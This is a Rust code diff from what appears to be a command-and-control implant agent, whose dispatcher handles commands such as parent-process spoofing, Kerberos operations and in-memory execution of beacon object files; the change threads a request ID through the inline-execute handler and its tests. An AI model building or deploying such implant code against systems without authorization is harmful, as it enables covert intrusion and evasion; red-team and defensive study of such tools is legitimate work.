@@ -169,9 +169,14 @@ pub fn dispatch(
         DemonCommand::CommandProcPpidSpoof => handle_proc_ppid_spoof(&package.payload, config),
         DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
         DemonCommand::CommandConfig => handle_config(&package.payload, config),
-        DemonCommand::CommandInlineExecute => {
-            handle_inline_execute(&package.payload, config, mem_files, job_store, bof_output_queue)
-        }
+        DemonCommand::CommandInlineExecute => handle_inline_execute(
+            &package.payload,
+            package.request_id,
+            config,
+            mem_files,
+            job_store,
+            bof_output_queue,
+        ),
         DemonCommand::CommandJob => handle_job(&package.payload, job_store),
         DemonCommand::CommandPsImport => handle_ps_import(&package.payload, ps_scripts, mem_files),
         DemonCommand::CommandAssemblyInlineExecute => {
@@ -3576,15 +3581,16 @@ fn handle_screenshot() -> DispatchResult {
 /// `CommandInlineExecute` command ID.
 fn handle_inline_execute(
     payload: &[u8],
+    request_id: u32,
     config: &SpecterConfig,
     mem_files: &mut MemFileStore,
     job_store: &mut JobStore,
     bof_output_queue: &BofOutputQueue,
 ) -> DispatchResult {
-    // job_store and bof_output_queue are only consumed on Windows inside the
-    // #[cfg(windows)] block.
+    // job_store, bof_output_queue, and request_id are only consumed on Windows
+    // inside the #[cfg(windows)] block for threaded execution.
     #[cfg(not(windows))]
-    let _ = (job_store, bof_output_queue);
+    let _ = (job_store, bof_output_queue, request_id);
 
     let mut offset = 0;
 
@@ -3678,6 +3684,7 @@ fn handle_inline_execute(
             bof_data.clone(),
             arg_data.clone(),
             bof_output_queue.clone(),
+            request_id,
         ) {
             Some(handle) => {
                 let job_id = job_store.add(JOB_TYPE_THREAD, handle);
@@ -7497,6 +7504,7 @@ mod tests {
     fn inline_execute_short_payload_returns_could_not_run() {
         let result = handle_inline_execute(
             &[],
+            1,
             &SpecterConfig::default(),
             &mut HashMap::new(),
             &mut JobStore::new(),
@@ -7528,6 +7536,7 @@ mod tests {
 
         let result = handle_inline_execute(
             &payload,
+            1,
             &SpecterConfig::default(),
             &mut HashMap::new(),
             &mut JobStore::new(),
@@ -7557,6 +7566,7 @@ mod tests {
 
         let result = handle_inline_execute(
             &payload,
+            1,
             &SpecterConfig::default(),
             &mut mem_files,
             &mut JobStore::new(),
@@ -7588,6 +7598,7 @@ mod tests {
 
         let result = handle_inline_execute(
             &payload,
+            1,
             &SpecterConfig::default(),
             &mut mem_files,
             &mut JobStore::new(),
